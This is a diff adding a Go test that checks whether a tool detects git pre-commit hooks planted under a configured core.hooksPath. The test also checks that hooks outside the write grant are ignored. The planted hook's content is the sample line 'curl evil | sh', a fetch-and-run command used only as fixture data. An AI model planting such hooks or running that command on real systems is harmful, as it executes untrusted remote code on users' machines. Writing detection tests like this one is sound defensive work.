@@ -5,6 +5,7 @@ package linux
 import (
 	"context"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"slices"
 	"strings"
@@ -60,6 +61,51 @@ func TestChangedAutoExecNamesEveryKindOfChange(t *testing.T) {
 	}
 	if slices.Contains(got, untouched) {
 		t.Errorf("%s was not changed but is reported", untouched)
+	}
+}
+
+// The whole point of resolving core.hooksPath is the value nobody hard-codes, so the
+// test uses one: a directory of the repo's own naming, reached only because git was
+// asked. The absolute case is the one seen in the wild - a hooks dir in another checkout
+// entirely - and it must be dropped, because a path outside every write grant is not one
+// the run could have planted.
+func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
+	grant := t.TempDir()
+	elsewhere := t.TempDir()
+	git := func(args ...string) {
+		t.Helper()
+		cmd := exec.Command("git", args...)
+		cmd.Dir = grant
+		if out, err := cmd.CombinedOutput(); err != nil {
+			t.Fatalf("git %v: %v: %s", args, err, out)
+		}
+	}
+	git("init", "-q")
+	git("config", "core.hooksPath", "scripts/githooks")
+	inTree := filepath.Join(grant, "scripts", "githooks")
+	if err := os.MkdirAll(inTree, 0o755); err != nil {
+		t.Fatal(err)
+	}
+
+	before := snapshotAutoExec([]string{grant})
+	planted := filepath.Join(inTree, "pre-commit")
+	if err := os.WriteFile(planted, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if got := changedAutoExec(before, snapshotAutoExec([]string{grant})); !slices.Equal(got, []string{planted}) {
+		t.Errorf("changed = %v, want %v", got, []string{planted})
+	}
+
+	git("config", "core.hooksPath", filepath.Join(elsewhere, "hooks"))
+	if err := os.MkdirAll(filepath.Join(elsewhere, "hooks"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	before = snapshotAutoExec([]string{grant})
+	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "pre-commit"), []byte("x\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if got := changedAutoExec(before, snapshotAutoExec([]string{grant})); len(got) != 0 {
+		t.Errorf("a hooks dir outside every write grant is out of scope, got %v", got)
 	}
 }
 
